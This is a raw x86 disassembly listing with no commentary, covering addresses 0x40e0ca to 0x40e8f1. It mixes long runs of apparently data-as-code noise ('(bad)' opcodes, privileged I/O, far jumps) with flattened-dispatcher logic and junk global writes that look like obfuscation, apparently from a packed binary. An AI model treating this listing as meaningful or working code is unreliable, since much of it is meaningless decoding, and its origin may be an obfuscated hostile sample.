  40e0ca:	sbb    ebx,DWORD PTR [esi-0x7f]
  40e0cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0ce:	icebp  
  40e0cf:	jg     0x40e0aa
  40e0d1:	dec    eax
  40e0d2:	lock xchg edx,eax
  40e0d4:	fcomp  st(7)
  40e0d6:	popa   
  40e0d7:	or     BYTE PTR [ebx],bl
  40e0d9:	rol    DWORD PTR [ebp-0x39],0xf6
  40e0dd:	jecxz  0x40e107
  40e0df:	xchg   edi,eax
  40e0e0:	cmp    eax,0xc9cf9319
  40e0e5:	mov    cl,0x53
  40e0e7:	inc    edi
  40e0e8:	(bad)  
  40e0e9:	push   0xffffff83
  40e0eb:	cmp    al,0xa0
  40e0ed:	div    BYTE PTR [edx-0xfc42e1d]
  40e0f3:	dec    ebx
  40e0f4:	inc    ebx
  40e0f5:	pop    ecx
  40e0f6:	out    0xe4,al
  40e0f8:	sub    eax,0x25edd712
  40e0fd:	aam    0x71
  40e0ff:	stc    
  40e100:	les    edi,FWORD PTR [esi-0x55]
  40e103:	shl    BYTE PTR [esi+0x3],1
  40e106:	dec    ecx
  40e107:	jl     0x40e0f1
  40e109:	mov    ebp,0xc2c84aef
  40e10e:	jnp    0x40e183
  40e110:	dec    ebx
  40e111:	cmp    BYTE PTR [eax+0x56],0x98
  40e115:	jp     0x40e117
  40e117:	lea    esp,[ebp-0xb]
  40e11a:	and    dl,bl
  40e11c:	lods   al,BYTE PTR ds:[esi]
  40e11d:	pop    esi
  40e11e:	stos   BYTE PTR es:[edi],al
  40e11f:	xor    eax,0x671ec960
  40e124:	int3   
  40e125:	xor    dl,BYTE PTR [edx+0x3c]
  40e128:	sub    al,0xd0
  40e12a:	pop    ebx
  40e12b:	xor    eax,esi
  40e12d:	adc    DWORD PTR ds:0x4336a3,0x2097
  40e137:	mov    ebx,0x32729b
  40e13c:	xor    DWORD PTR ds:0x4336ef,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	dec    edi
  40e15b:	inc    esi
  40e15c:	push   0x5c
  40e15e:	jb     0x40e0fa
  40e160:	jle    0x40e1e0
  40e162:	adc    bh,BYTE PTR [edi+0x7e]
  40e165:	jle    0x40e12b
  40e167:	call   0xb364:0xdf5d0665
  40e16e:	mov    dh,0xbb
  40e170:	mov    dh,bl
  40e172:	add    eax,0xdce6312b
  40e177:	out    dx,eax
  40e178:	std    
  40e179:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e17a:	es iret 
  40e17c:	ins    DWORD PTR es:[edi],dx
  40e17d:	inc    ecx
  40e17e:	jle    0x40e189
  40e180:	or     eax,0xe44ed89a
  40e185:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e186:	lods   al,BYTE PTR ds:[esi]
  40e187:	cmp    bl,ah
  40e189:	inc    ebx
  40e18a:	cld    
  40e18b:	xchg   ecx,eax
  40e18c:	sub    BYTE PTR [ecx],dl
  40e18e:	cmp    al,0xf9
  40e190:	bound  esi,QWORD PTR [ebx+esi*8+0x6a]
  40e194:	popf   
  40e195:	xor    esi,DWORD PTR [ebx]
  40e197:	out    0x59,eax
  40e199:	pop    ebp
  40e19a:	pushf  
  40e19b:	push   eax
  40e19c:	cld    
  40e19d:	jl     0x40e1a7
  40e19f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1a0:	mov    dl,0x73
  40e1a2:	mov    WORD PTR [eax-0x530e1c1f],gs
  40e1a8:	div    BYTE PTR [ebx-0x41]
  40e1ab:	jp     0x40e165
  40e1ad:	cmp    bh,BYTE PTR [edx]
  40e1af:	mov    cl,0xda
  40e1b1:	sbb    DWORD PTR [eax+0x6f],edx
  40e1b4:	adc    edi,ecx
  40e1b6:	sti    
  40e1b7:	mov    edx,0xb25e908d
  40e1bc:	mov    ecx,0x5a620ebc
  40e1c1:	sub    DWORD PTR [edi+0x75bd8cb0],edx
  40e1c7:	lahf   
  40e1c8:	cmp    DWORD PTR [ebp-0x50],esi
  40e1cb:	scas   eax,DWORD PTR es:[edi]
  40e1cc:	mov    bl,0x7
  40e1ce:	imul   ecx,DWORD PTR [edx-0x16],0xffffffc3
  40e1d2:	add    cl,BYTE PTR [ebp+0x64148203]
  40e1d8:	jbe    0x40e172
  40e1da:	sbb    al,0xbb
  40e1dc:	mov    esp,0x6de4b9a0
  40e1e1:	into   
  40e1e2:	xchg   DWORD PTR [edx-0x15],ebp
  40e1e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1e6:	sbb    BYTE PTR [edi+edx*4+0x7f175748],0x47
  40e1ee:	ret    0x7f2b
  40e1f1:	hlt    
  40e1f2:	fist   WORD PTR [eax]
  40e1f4:	or     bl,BYTE PTR [edi+ecx*2-0x23]
  40e1f8:	mov    ecx,0x91a34501
  40e1fd:	or     ch,bh
  40e1ff:	addr16 jnp 0x40e1f9
  40e202:	fidivr DWORD PTR [eax+edx*4-0x1cc77619]
  40e209:	std    
  40e20a:	dec    ebp
  40e20b:	loopne 0x40e27b
  40e20d:	inc    edx
  40e20e:	out    dx,eax
  40e20f:	pop    ebx
  40e210:	mov    ecx,cs
  40e212:	xor    BYTE PTR [ecx-0x31],ah
  40e215:	pop    esi
  40e216:	fstp   DWORD PTR [esi+0x17ea0fd]
  40e21c:	(bad)
  40e220:	out    dx,al
  40e221:	stos   BYTE PTR es:[edi],al
  40e222:	mov    ah,0xeb
  40e224:	test   BYTE PTR ss:[edi-0x1f],al
  40e228:	or     ebx,DWORD PTR [edx+ebx*1]
  40e22b:	or     BYTE PTR [ebx+0x72],bl
  40e22e:	push   esp
  40e22f:	inc    ebp
  40e230:	jno    0x40e203
  40e232:	jmp    0x40e27c
  40e234:	jp     0x30c7c8b
  40e23a:	hlt    
  40e23b:	out    dx,eax
  40e23c:	jne    0x40e290
  40e23e:	fld    DWORD PTR [ebp+ebx*2+0x35]
  40e242:	xlat   BYTE PTR ds:[ebx]
  40e243:	xchg   DWORD PTR [esi-0x4a],edi
  40e246:	sbb    ecx,DWORD PTR [esi-0x26]
  40e249:	clc    
  40e24a:	sahf   
  40e24b:	mov    al,ds:0x9724ef95
  40e250:	ins    BYTE PTR es:[edi],dx
  40e251:	mov    ch,0x63
  40e253:	out    dx,al
  40e254:	lds    eax,FWORD PTR [eax+0x2cb08725]
  40e25a:	jnp    0x40e29e
  40e25c:	mov    cs,ebp
  40e25e:	pop    es
  40e25f:	ret    0x1dfe
  40e262:	xchg   DWORD PTR [edx],esp
  40e264:	test   edx,edi
  40e266:	xor    BYTE PTR ds:0x49b61c5f,al
  40e26c:	jb     0x40e292
  40e26e:	les    ebx,FWORD PTR [eax-0x16]
  40e271:	cmp    eax,0x551f3f
  40e276:	les    esi,FWORD PTR [esp+eax*4+0x6b]
  40e27a:	add    DWORD PTR [edx],esi
  40e27c:	dec    ebx
  40e27d:	sti    
  40e27e:	cmp    al,BYTE PTR [edx+0x45894a18]
  40e284:	call   0xff496014
  40e289:	add    eax,0x43360b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x4336e3,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x43372b
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433697,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43360b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x4336d7,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43369f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43361b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43371f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x43372b,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x4336df,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43371b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x4336d7,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x433653,0x43365f
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x4336a7,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x4336d3,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x4336d7,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433603,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433603,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433697,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433603,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x4336af,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x43372b
  40e3da:	and    DWORD PTR ds:0x43360b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x433663,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433713
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	mov    BYTE PTR [ecx+0x59],0x68
  40e418:	push   ss
  40e419:	cwde   
  40e41a:	jle    0x40e49a
  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e3f9
  40e421:	sub    BYTE PTR [ebx],ch
  40e423:	cmp    BYTE PTR [esi+0x133970ac],cl
  40e429:	ret    0x95bd
  40e42c:	push   eax
  40e42d:	dec    eax
  40e42e:	data16 fisttp QWORD PTR [ecx+ebp*2+0x61]
  40e433:	xchg   edi,eax
  40e434:	inc    esi
  40e435:	jge    0x40e41a
  40e437:	clc    
  40e438:	jg     0x40e458
  40e43a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e43b:	clc    
  40e43c:	mov    edx,0x3145ebfc
  40e441:	fisttp QWORD PTR [ebx+0x76]
  40e444:	xchg   ebx,eax
  40e445:	mov    al,0x22
  40e447:	push   edi
  40e448:	and    eax,ebp
  40e44a:	(bad)  
  40e44b:	aaa    
  40e44c:	fld    DWORD PTR [ecx]
  40e44e:	adc    al,0x54
  40e450:	dec    edx
  40e451:	xor    bl,BYTE PTR [ebp-0x1b5d84a6]
  40e457:	push   esp
  40e458:	xchg   eax,edx
  40e45a:	pop    ebx
  40e45b:	sub    BYTE PTR [edi],bh
  40e45d:	fwait
  40e45e:	dec    edx
  40e45f:	dec    eax
  40e460:	jae    0x40e4cb
  40e462:	pop    ecx
  40e463:	shl    DWORD PTR [ecx],0x24
  40e466:	mov    dh,0x4e
  40e468:	adc    al,0xd4
  40e46a:	jae    0x40e4b2
  40e46c:	bound  esi,QWORD PTR [ebp-0x2a]
  40e46f:	stos   DWORD PTR es:[edi],eax
  40e470:	add    edx,ebx
  40e472:	push   0xffffff95
  40e474:	loope  0x40e4c0
  40e476:	sub    al,0xde
  40e478:	stos   BYTE PTR es:[edi],al
  40e479:	sub    esp,ebx
  40e47b:	cli    
  40e47c:	sbb    ebx,DWORD PTR [ebx+0x7]
  40e47f:	outs   dx,BYTE PTR ds:[esi]
  40e480:	xchg   BYTE PTR [edi-0x1dea7acc],dh
  40e486:	xor    edi,DWORD PTR [esi-0x86de72d]
  40e48c:	test   eax,0xebd8406c
  40e491:	xchg   esp,eax
  40e492:	pop    ecx
  40e493:	sar    DWORD PTR [eax],0xf7
  40e496:	cs ret 
  40e498:	xor    al,BYTE PTR [ebx-0x75]
  40e49b:	test   ch,ch
  40e49d:	aad    0x9f
  40e49f:	data16 (bad) 
  40e4a1:	mov    WORD PTR [ebp+0x23fd1f],?
  40e4a7:	adc    DWORD PTR [ebx-0x27],edx
  40e4aa:	pop    ebp
  40e4ab:	mov    dl,0xee
  40e4ad:	pop    esi
  40e4ae:	aam    0x64
  40e4b0:	pop    esi
  40e4b1:	adc    eax,0xe2804b3
  40e4b6:	out    0xaa,al
  40e4b8:	sub    DWORD PTR [esi],eax
  40e4ba:	push   esp
  40e4bb:	inc    eax
  40e4bc:	clc    
  40e4bd:	pop    DWORD PTR [ebx]
  40e4bf:	(bad)  
  40e4c0:	aad    0xc8
  40e4c2:	iret   
  40e4c3:	pop    ebp
  40e4c4:	jbe    0x40e490
  40e4c6:	adc    al,0xf6
  40e4c8:	inc    eax
  40e4c9:	pop    esi
  40e4ca:	fs mov dl,0x8a
  40e4cd:	jecxz  0x40e533
  40e4cf:	cmp    cl,BYTE PTR [ebx-0x23600039]
  40e4d5:	mov    dl,0x33
  40e4d7:	es push 0x40
  40e4da:	js     0x40e4f6
  40e4dc:	mov    eax,0x2d502efd
  40e4e1:	fiadd  WORD PTR [eax-0x3770f702]
  40e4e7:	sbb    ah,BYTE PTR [edx+0x47]
  40e4ea:	add    dl,BYTE PTR [ebx]
  40e4ec:	mov    bl,0xbc
  40e4ef:	sahf   
  40e4f0:	fidivr DWORD PTR [ecx-0x4f]
  40e4f3:	xchg   BYTE PTR [esp+ebx*8-0x76c6ae85],cl
  40e4fa:	popf   
  40e4fb:	cmp    DWORD PTR [edi+0x2efb314d],esp
  40e501:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e502:	sub    ax,0xa353
  40e506:	pop    eax
  40e507:	mov    ah,0xd2
  40e509:	jbe    0x40e4cc
  40e50b:	mov    eax,ds:0xad9ef0f2
  40e510:	cmc    
  40e511:	inc    edi
  40e512:	nop
  40e513:	or     al,0x29
  40e515:	xchg   edi,eax
  40e516:	std    
  40e517:	adc    cl,BYTE PTR [ebx+0x1d06dd85]
  40e51d:	adc    eax,0xcf202a51
  40e522:	dec    esp
  40e523:	jge    0x40e554
  40e525:	jle    0x40e4b4
  40e527:	in     al,0x83
  40e529:	stos   DWORD PTR es:[edi],eax
  40e52a:	cli    
  40e52b:	test   ch,0xaa
  40e52e:	jp     0x40e589
  40e530:	out    0xed,al
  40e532:	pop    ebx
  40e533:	xchg   esi,eax
  40e534:	xor    eax,0xcda63e7d
  40e539:	fsubrp st(0),st
  40e53b:	ins    BYTE PTR es:[edi],dx
  40e53c:	mov    eax,DWORD PTR [ebp-0xc]
  40e53f:	or     DWORD PTR ds:0x4336a3,0x4336eb
  40e549:	xor    eax,esi
  40e54b:	add    eax,ebx
  40e54d:	sbb    DWORD PTR ds:0x4336db,0x4336af
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0x5ef261b8
  40e5b4:	jns    0x40e606
  40e5b6:	and    eax,0x7e7e992a
  40e5bb:	adc    bh,BYTE PTR [edi+0x7e]
  40e5be:	jle    0x40e5d6
  40e5c0:	inc    ecx
  40e5c1:	retf   
  40e5c2:	mov    ebx,0x959fd996
  40e5c7:	adc    al,0x0
  40e5c9:	add    al,0x3a
  40e5cb:	add    esp,DWORD PTR [edx-0xab9b44c]
  40e5d1:	sbb    eax,0xc373fcec
  40e5d6:	inc    edi
  40e5d7:	mov    bl,0xa
  40e5d9:	sbb    DWORD PTR [edx],esp
  40e5db:	cmp    al,0xb
  40e5dd:	jp     0x40e5fc
  40e5df:	mov    esp,0xdc58631e
  40e5e4:	dec    eax
  40e5e5:	push   esi
  40e5e6:	and    eax,DWORD PTR [edx-0x14]
  40e5e9:	mov    ecx,0xaa90db18
  40e5ee:	addr16 sbb esi,edx
  40e5f1:	add    DWORD PTR [edi],0x55
  40e5f4:	and    esi,DWORD PTR [ecx-0x6f]
  40e5f7:	push   edx
  40e5f8:	push   edx
  40e5f9:	fnstenv [ebx]
  40e5fb:	(bad)  
  40e5fc:	aas    
  40e5fd:	pop    ss
  40e5fe:	mov    dh,BYTE PTR [edi]
  40e600:	xchg   DWORD PTR [eax+ecx*2-0x771435f7],edi
  40e607:	and    BYTE PTR [ebp+esi*1-0x45],ch
  40e60b:	out    0xe1,eax
  40e60d:	push   0x63d9f8d9
  40e612:	pushf  
  40e613:	ficom  DWORD PTR [edi+ecx*2+0xe]
  40e617:	mov    ah,0xc
  40e619:	sub    DWORD PTR [edi+0x5c],esp
  40e61c:	aad    0xba
  40e61e:	sbb    DWORD PTR [esi+0x6ab998f1],esp
  40e624:	push   edi
  40e625:	cli    
  40e626:	test   DWORD PTR [edx-0x4d],edi
  40e629:	jnp    0x40e62b
  40e62b:	clc    
  40e62c:	cmp    eax,0x63b8e5c9
  40e631:	xor    al,0xcb
  40e633:	mov    DWORD PTR [eax+0x531adbe1],esp
  40e639:	cmp    al,0x3e
  40e63b:	or     al,0x9
  40e63d:	xor    eax,0x8529138
  40e642:	inc    esp
  40e643:	mov    ebp,0x52181dd7
  40e648:	and    BYTE PTR [edi],cl
  40e64a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e64b:	jo     0xb909da3d
  40e651:	jnp    0x40e69c
  40e653:	addr16 pop ebx
  40e655:	fstp   QWORD PTR [eax-0x4bf1967b]
  40e65b:	jmp    0x63c732e1
  40e660:	push   esi
  40e661:	gs xor al,0xa1
  40e664:	popf   
  40e665:	jb     0x40e664
  40e667:	pusha  
  40e668:	mov    ds:0xcbbfbe51,al
  40e66d:	inc    edi
  40e66e:	adc    bh,BYTE PTR [eax]
  40e670:	test   eax,0xfe040319
  40e675:	adc    eax,0xdff28e42
  40e67a:	mov    esi,DWORD PTR [ebx]
  40e67c:	addr16 push ds
  40e67e:	pop    es
  40e67f:	fs mov eax,0xf8d2f050
  40e685:	test   al,0xa2
  40e687:	or     eax,0xbee8b81d
  40e68c:	sbb    DWORD PTR [ebx-0x78],0xffffffef
  40e690:	or     bl,BYTE PTR [ecx+0x47]
  40e693:	mov    ebp,ds
  40e695:	cmc    
  40e696:	in     al,dx
  40e697:	sub    DWORD PTR [edx-0x7c04c61d],0xffffffec
  40e69e:	push   es
  40e69f:	jg     0x40e671
  40e6a1:	ret    
  40e6a2:	push   ds
  40e6a3:	arpl   WORD PTR [edx-0x32],di
  40e6a6:	in     eax,0xcf
  40e6a8:	mov    ah,0xf7
  40e6aa:	bound  esp,QWORD PTR [eax]
  40e6ac:	ret    
  40e6ad:	push   edi
  40e6ae:	mov    ch,0xae
  40e6b0:	ins    DWORD PTR es:[edi],dx
  40e6b1:	mov    eax,0x129f1871
  40e6b6:	arpl   cx,di
  40e6b8:	add    ch,BYTE PTR [edi-0x28]
  40e6bb:	adc    esp,ebp
  40e6bd:	stc    
  40e6be:	ja     0x40e683
  40e6c0:	aas    
  40e6c1:	retf   0xd63a
  40e6c4:	arpl   WORD PTR [esi],dx
  40e6c6:	jmp    0xc493ba0e
  40e6cb:	push   esi
  40e6cc:	sbb    eax,0xeb92f223
  40e6d1:	sbb    eax,0xc1bbff96
  40e6d6:	push   edx
  40e6d7:	test   eax,0xa155e5d4
  40e6dc:	xor    al,0x3b
  40e6de:	inc    ecx
  40e6df:	add    BYTE PTR [ecx+0x458b0845],cl
  40e6e5:	in     al,dx
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx+0x5482d692]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e6eb
  40e704:	repnz leave 
  40e706:	cld    
  40e707:	pop    ss
  40e708:	mov    bh,0x60
  40e70a:	cmp    edi,DWORD PTR [eax+0x4]
  40e70d:	js     0x40e6da
  40e70f:	cmp    eax,0xd1f2f987
  40e714:	ins    DWORD PTR es:[edi],dx
  40e715:	inc    esi
  40e716:	dec    ebp
  40e717:	mov    ds:0xc0d8bed5,al
  40e71c:	pushf  
  40e71d:	imul   ecx,DWORD PTR [edi],0x34
  40e720:	icebp  
  40e721:	iret   
  40e722:	pop    ebx
  40e723:	adc    edx,DWORD PTR [ebp-0x4fde7833]
  40e729:	pop    ebp
  40e72a:	dec    eax
  40e72b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e72c:	sub    DWORD PTR [esi+0x4b],edi
  40e72f:	pop    esp
  40e730:	ins    DWORD PTR es:[edi],dx
  40e731:	into   
  40e732:	dec    ebx
  40e733:	xchg   DWORD PTR [esp+ebx*8+0x2c],esi
  40e737:	dec    BYTE PTR [esi-0x35af8b52]
  40e73d:	stc    
  40e73e:	cmp    BYTE PTR [ebp-0x38033a6b],al
  40e744:	sbb    al,0x23
  40e746:	retf   0x827e
  40e749:	jns    0x40e749
  40e74b:	sahf   
  40e74c:	or     esp,DWORD PTR [eax-0x71]
  40e74f:	nop
  40e750:	xchg   ecx,eax
  40e751:	inc    edx
  40e752:	xor    eax,0x3ea2d937
  40e757:	int3   
  40e758:	mov    BYTE PTR [esi-0x3799215a],ah
  40e75e:	nop
  40e75f:	clc    
  40e760:	dec    edx
  40e761:	jae    0x40e745
  40e763:	inc    esp
  40e764:	fadd   DWORD PTR [edi-0x22cebaf1]
  40e76a:	enter  0xed2d,0xc1
  40e76e:	and    al,0xfb
  40e770:	test   DWORD PTR [ebx-0x4d],0x26be04ab
  40e777:	pop    ds
  40e778:	data16 fidivr DWORD PTR [edi+0x10]
  40e77c:	(bad)  
  40e77d:	loop   0x40e786
  40e77f:	jle    0x40e763
  40e781:	aaa    
  40e782:	mov    eax,0xe59c47c6
  40e787:	aaa    
  40e788:	es sti 
  40e78a:	xor    BYTE PTR [edi+0x9],al
  40e78d:	jmp    DWORD PTR [eax+0x77]
  40e790:	ficomp DWORD PTR [ecx]
  40e792:	mov    esi,DWORD PTR [edi]
  40e794:	xor    BYTE PTR [eax+0x73],dh
  40e797:	ins    DWORD PTR es:[edi],dx
  40e798:	jmp    FWORD PTR [esi+0x36]
  40e79b:	dec    edx
  40e79c:	sub    bh,BYTE PTR [ecx-0x476c7974]
  40e7a2:	dec    ebp
  40e7a3:	dec    ebx
  40e7a4:	sbb    DWORD PTR [edx+0x2f],ecx
  40e7a7:	test   eax,0xfbe805e4
  40e7ac:	or     al,0x21
  40e7af:	fild   WORD PTR [edx]
  40e7b1:	cmp    BYTE PTR ds:[edi],dh
  40e7b4:	lods   eax,DWORD PTR ds:[esi]
  40e7b5:	test   esp,0x968b12f8
  40e7bb:	ja     0x40e801
  40e7bd:	xchg   ebp,eax
  40e7be:	imul   esi,DWORD PTR gs:[edx+0x238439df],0x9fc50371
  40e7c9:	out    dx,eax
  40e7ca:	pop    ds
  40e7cb:	inc    BYTE PTR [ebp+0x3a8033e6]
  40e7d1:	jecxz  0x40e776
  40e7d3:	cli    
  40e7d4:	(bad)  
  40e7d5:	mov    al,ds:0x10e19502
  40e7da:	cmp    DWORD PTR [eax+0x63],esp
  40e7dd:	cli    
  40e7de:	cmc    
  40e7df:	adc    dh,BYTE PTR [esi+0x7177b9e4]
  40e7e5:	push   ss
  40e7e6:	mov    ?,WORD PTR [eax-0x4a30ac84]
  40e7ec:	mov    BYTE PTR [ecx+0x3a],dh
  40e7ef:	xchg   edi,eax
  40e7f0:	push   ebp
  40e7f1:	xchg   edi,eax
  40e7f2:	call   FWORD PTR [edi+0x13]
  40e7f5:	inc    edi
  40e7f6:	not    esp
  40e7f8:	adc    edi,ebp
  40e7fa:	push   ebx
  40e7fb:	stos   BYTE PTR es:[edi],al
  40e7fc:	out    dx,eax
  40e7fd:	add    ebp,DWORD PTR [edx-0x274d3e14]
  40e803:	pushf  
  40e804:	push   ds
  40e805:	daa    
  40e806:	ror    BYTE PTR [eax+0x6f],0x44
  40e80a:	ja     0x40e7a5
  40e80c:	mov    esi,0xda584224
  40e811:	inc    esi
  40e812:	inc    ebp
  40e813:	add    ah,BYTE PTR [ecx]
  40e815:	jb     0x40e85b
  40e817:	mov    cl,0xc9
  40e819:	cmp    dh,BYTE PTR [edi+edi*4-0x7676f2e3]
  40e820:	inc    ebp
  40e821:	cld    
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e83a
  40e854:	push   ds
  40e855:	inc    ecx
  40e856:	mov    esp,edx
  40e858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e859:	jle    0x40e8d9
  40e85b:	adc    bh,BYTE PTR [edi+0x7e]
  40e85e:	jle    0x40e894
  40e860:	mov    ebx,?
  40e862:	pop    ss
  40e863:	pushf  
  40e864:	test   al,0xe6
  40e866:	not    ebx
  40e868:	cs pop ebx
  40e86a:	and    al,0x7d
  40e86c:	aaa    
  40e86d:	mov    eax,0x698d5822
  40e872:	or     eax,0x94766268
  40e877:	and    dl,BYTE PTR ds:0x2aec9cb6
  40e87d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e87e:	jl     0x40e81a
  40e880:	pop    esp
  40e881:	xlat   BYTE PTR ds:[ebx]
  40e882:	dec    edi
  40e883:	repz push ebx
  40e885:	call   0x10d3:0xf6621e23
  40e88c:	in     al,0x6e
  40e88e:	sub    eax,0x8b8ca71e
  40e893:	mov    DWORD PTR [esi-0x1e],ebx
  40e896:	inc    ebx
  40e897:	push   eax
  40e898:	(bad)  
  40e899:	fwait
  40e89a:	ret    0x54f
  40e89d:	inc    eax
  40e89e:	add    esi,DWORD PTR [ecx-0x31]
  40e8a1:	jmp    0xe9536778
  40e8a6:	ins    BYTE PTR es:[edi],dx
  40e8a7:	lods   eax,DWORD PTR ds:[esi]
  40e8a8:	push   esp
  40e8a9:	into   
  40e8aa:	js     0x40e8a1
  40e8ac:	adc    esp,DWORD PTR ds:0x1567fb86
  40e8b2:	lea    eax,[eax]
  40e8b4:	ud1    ebx,DWORD PTR [ebp+0x4e]
  40e8b8:	xor    esi,DWORD PTR [esi+ebp*1]
  40e8bb:	adc    eax,0x68a01e8d
  40e8c0:	imul   esi,DWORD PTR [eax*4+0x7a07d0ae],0x59
  40e8c8:	lods   eax,DWORD PTR ds:[esi]
  40e8c9:	mov    DWORD PTR [edi+0x13],edx
  40e8cc:	bound  ecx,QWORD PTR [eax+0x101c6ae9]
  40e8d2:	pop    ecx
  40e8d3:	inc    ebp
  40e8d4:	nop
  40e8d5:	aaa    
  40e8d6:	jp     0x40e90b
  40e8d8:	sub    al,BYTE PTR [ecx]
  40e8da:	rcr    DWORD PTR [ecx+0x45],1
  40e8dd:	or     al,0xdb
  40e8df:	mul    BYTE PTR ds:0xa3be6160
  40e8e5:	and    al,0x54
  40e8e7:	inc    esi
  40e8e8:	cmp    dh,ch
  40e8ea:	es test esp,0x3348741
  40e8f1:	mov    bl,0x7c
